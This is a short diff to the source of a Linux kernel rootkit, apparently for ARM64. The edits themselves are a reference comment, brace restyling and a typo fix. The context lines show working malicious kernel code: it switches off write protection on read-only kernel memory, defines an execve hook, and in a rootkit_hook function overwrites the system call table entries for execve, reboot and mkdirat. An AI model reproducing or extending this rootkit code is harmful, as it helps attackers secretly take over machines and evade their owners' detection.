@@ -69,6 +69,10 @@ static unsigned long lookup_symbols (const char *name)
 
 static void write_protection_on (bool on)
 {
+	/*
+	* ref:
+	* https://javamana.com/2021/07/20210731105038539g.html
+	*/
 	/* modify the memory settings to allow us to overwrite the system call table */
         static unsigned long start_rodata, end_rodata, section_size = 0;
 	static bool visited = false;
@@ -84,15 +88,13 @@ static void write_protection_on (bool on)
         	/* on == true => set the mermory to read-only */
                 update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size, PAGE_KERNEL_RO);
                 return;
-        } else 
-        {
+        } else {
         	/* on == false => disable the write protection */
                 update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size, PAGE_KERNEL);
                 return ;
         }
 }
 
-// asmlinkage long execve_hook (const char *pathname, char *const argv[], char *const envp[])
 asmlinkage long execve_hook (const struct pt_regs *regs)
 {
 	/*
@@ -126,7 +128,7 @@ static unsigned long rootkit_hook (void)
 		preempt_disable();
 		write_protection_on(false);
 
-		/* safe the real system calls */
+		/* save the real system calls */
 		execve_ori = (void*)sys_call_table_[__NR_execve];
 		reboot_ori = (void*)sys_call_table_[__NR_reboot];
 		mkdir_ori  = (void*)sys_call_table_[__NR_mkdirat];
